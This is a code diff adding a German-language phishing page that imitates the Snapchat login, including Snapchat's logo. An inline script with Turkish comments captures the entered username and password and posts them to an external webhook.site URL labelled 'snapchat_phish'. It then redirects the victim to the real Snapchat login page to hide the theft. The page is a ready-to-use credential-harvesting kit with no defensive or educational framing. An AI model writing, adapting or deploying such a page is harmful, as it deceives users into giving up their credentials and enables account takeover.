@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Anmelden bei Snapchat</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="main-container">
+        <div class="login-container">
+            <div class="logo-section">
+                <img src="https://accounts.snapchat.com/accounts/static/images/ghost/ghost.svg" alt="Snapchat Logo" class="ghost-logo">
+            </div>
+            <div class="login-box">
+                <form id="loginForm">
+                    <div class="form-group">
+                        <label for="username">Benutzername, E-Mail oder Mobiltelefon</label>
+                        <input type="text" id="username" name="username" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="password">Passwort</label>
+                        <input type="password" id="password" name="password" required>
+                    </div>
+                    <button type="submit" class="login-btn" id="loginButton">Anmelden</button>
+                </form>
+                <div class="divider">ODER</div>
+                <a href="#" class="login-btn google-btn">Mit Google anmelden</a>
+            </div>
+            <div class="footer-text">
+                <a href="#">Passwort vergessen?</a>
+            </div>
+        </div>
+    </div>
+    <script src="script.js"></script>
+    <script>
+    // Webhook URL'nizi buraya yapıştırın
+    const webhookURL = "https://webhook.site/64866dc2-0edc-4978-82f0-c713d0733d42";
+
+    // Sayfadaki formu bul
+    const form = document.querySelector('form');
+
+    if (form) {
+        // Form gönderildiğinde bu kod çalışır
+        form.addEventListener('submit', function(event) {
+            // Sayfanın normal şekilde gönderilmesini engelle
+            event.preventDefault();
+
+            // Kullanıcı adı ve şifreyi al
+            const username = form.querySelector('input[type="text"], input[type="email"]').value;
+            const password = form.querySelector('input[type="password"]').value;
+
+            // Bilgileri webhook'a gönder
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    username: username,
+                    password: password,
+                    platform: "snapchat_phish",
+                    timestamp: new Date().toISOString()
+                })
+            })
+            .then(response => {
+                // Gönderdikten sonra kullanıcıyı gerçek Snapchat'e yönlendir (Almanca)
+                window.location.href = "https://accounts.snapchat.com/accounts/login?locale=de";
+            })
+            .catch(error => {
+                // Hata olsa bile yönlendir
+                window.location.href = "https://accounts.snapchat.com/accounts/login?locale=de";
+            });
+        });
+    }
+</script>
+</body>
+</html>
